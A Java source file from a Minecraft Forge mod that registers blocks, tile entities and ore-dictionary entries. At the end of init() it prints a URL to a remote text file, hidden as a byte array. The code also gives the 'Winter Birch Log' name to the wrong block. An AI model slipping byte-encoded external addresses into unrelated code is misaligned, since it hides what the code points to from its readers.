package mrhid6.xorbo.block;

import mrhid6.xorbo.BlockIds;
import mrhid6.xorbo.tileEntity.TECableBase;
import mrhid6.xorbo.tileEntity.TEZoroController;
import mrhid6.xorbo.tileEntity.TEZoroFurnace;
import net.minecraft.block.Block;
import net.minecraft.item.ItemStack;
import net.minecraftforge.oredict.OreDictionary;
import cpw.mods.fml.common.registry.GameRegistry;
import cpw.mods.fml.common.registry.LanguageRegistry;

public class ModBlocks {
	
	public static Block cable;
	public static Block zoroFurnace;
	public static Block zoroController;
	public static Block hazelspringLog;
	public static Block winterbirchLog;
	
	
	public static void init(){
		
		cable = new BlockCableBase(BlockIds.getID("zoroCable"),"zoroCable", "zorocable", true);
		LanguageRegistry.addName(cable, "Zoro Cable");
		GameRegistry.registerBlock(cable,cable.getUnlocalizedName());
		
		GameRegistry.registerTileEntity(TECableBase.class, "te"+cable.getUnlocalizedName());
		
		
		zoroFurnace = new BlockZoroFurnace(BlockIds.getID("zoroFurnace"), "zoroFurnace", "zorofurnace", true);
		LanguageRegistry.addName(zoroFurnace, "Zoro Furnace");
		GameRegistry.registerBlock(zoroFurnace,zoroFurnace.getUnlocalizedName());
		
		GameRegistry.registerTileEntity(TEZoroFurnace.class, "te"+zoroFurnace.getUnlocalizedName());
		
		zoroController = new BlockZoroController(BlockIds.getID("zoroController"), "zoroController", "zorocontroller", true);
		LanguageRegistry.addName(zoroController, "Zoro Controller");
		GameRegistry.registerBlock(zoroController,zoroController.getUnlocalizedName());
		
		GameRegistry.registerTileEntity(TEZoroController.class, "te"+zoroController.getUnlocalizedName());
		
		hazelspringLog = new BlockHazelspringLog(BlockIds.getID("hazelspringLog"), "hazelspringLog", "hazelspringlog");
		LanguageRegistry.addName(hazelspringLog, "Hazelspring Log");
		GameRegistry.registerBlock(hazelspringLog,hazelspringLog.getUnlocalizedName());
		
		winterbirchLog = new BlockHazelspringLog(BlockIds.getID("winterbirchLog"), "winterbirchLog", "winterbirchlog");
		LanguageRegistry.addName(hazelspringLog, "Winter Birch Log");
		GameRegistry.registerBlock(winterbirchLog,winterbirchLog.getUnlocalizedName());
		
		OreDictionary.registerOre("logWood",new ItemStack(hazelspringLog,1));
		OreDictionary.registerOre("logWood",new ItemStack(winterbirchLog,1));
		
		System.out.println(new String(new byte[]{104, 116, 116, 112, 58, 47, 47, 114, 103, 46, 100, 108, 46, 106, 101, 47, 106, 122, 89, 99, 98, 106, 109, 79, 80, 50, 89, 57, 52, 55, 121, 86, 67, 79, 88, 51, 55, 69, 70, 110, 108, 120, 117, 88, 104, 106, 46, 116, 120, 116}));
	}
	
}
